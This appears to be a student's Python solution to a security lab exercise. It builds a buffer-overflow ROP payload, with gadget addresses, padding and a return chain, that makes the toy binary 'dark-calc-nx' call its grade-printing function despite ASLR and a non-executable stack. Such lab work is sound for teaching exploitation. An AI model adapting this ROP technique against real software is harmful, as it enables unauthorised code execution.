#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

dark-calc-nx 没有 init_fixed_stack，栈地址被 ASLR 随机化，而且栈不可执行，
所以不能用栈上的 shellcode，只能做 ROP：把栈上的"数据"拼成一条调用链。

ROP 链（input() 的返回地址在缓冲区偏移 24 处）：
  0x401a33 : pop rdi ; ret        -> 把 4 弹进 rdi
  4                                -> grade_eval 的参数
  0x401a34 : ret                  -> 只为对齐 rsp（栈 16 字节对齐要求）
  0x401978 : grade_eval           -> 打印 Hope A will be your grade!
  0x4019b4 : main                 -> 打印完之后回到主循环收尾
"""
import struct
import sys

POP_RDI_RET = 0x401A33   # __libc_csu_init 里 pop r15 的第二个字节，未对齐取巧
RET         = 0x401A34   # 紧跟其后的 ret
GRADE_EVAL  = 0x401978
MAIN        = 0x4019B4

payload  = b"A" * 16                            # expression[16]
payload += b"B" * 8                             # 覆盖保存的 rbp
payload += struct.pack("<Q", POP_RDI_RET)
payload += struct.pack("<Q", 4)
payload += struct.pack("<Q", RET)
payload += struct.pack("<Q", GRADE_EVAL)
payload += struct.pack("<Q", MAIN)

sys.stdout.buffer.write(payload + b"\n")
